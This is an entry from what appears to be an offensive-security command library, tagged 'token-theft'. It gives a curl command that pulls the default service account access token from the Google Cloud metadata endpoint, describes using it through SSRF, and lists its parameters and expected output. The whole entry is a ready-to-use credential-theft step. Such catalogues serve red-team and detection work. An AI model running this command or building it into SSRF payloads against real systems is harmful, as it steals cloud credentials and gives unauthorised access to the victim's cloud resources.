---
id: cmd-uuid-2
data: >-
  curl -H "Metadata-Flavor: Google"
  http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
tags:
  - token-theft
  - gcp
type: command
output: JSON token object with access token value
executor: bash
platforms:
  - Linux
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.519Z'
verified: false
validated: true
submitted: true
---
# curl-obtain-gcp-token

## Command

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

## Description

Retrieve default service account access token from Google Cloud metadata service via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Metadata-Flavor: Google"` | Header for Google metadata auth | Yes |
| URL | Metadata endpoint for token | Yes |

## Examples

### Basic Usage

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

## Expected Output

JSON token object with access token value, expires_in, token_type.

## Related

- [[Related Procedure: Obtain-GCP-Service-Account-Token-via-Metadata]]
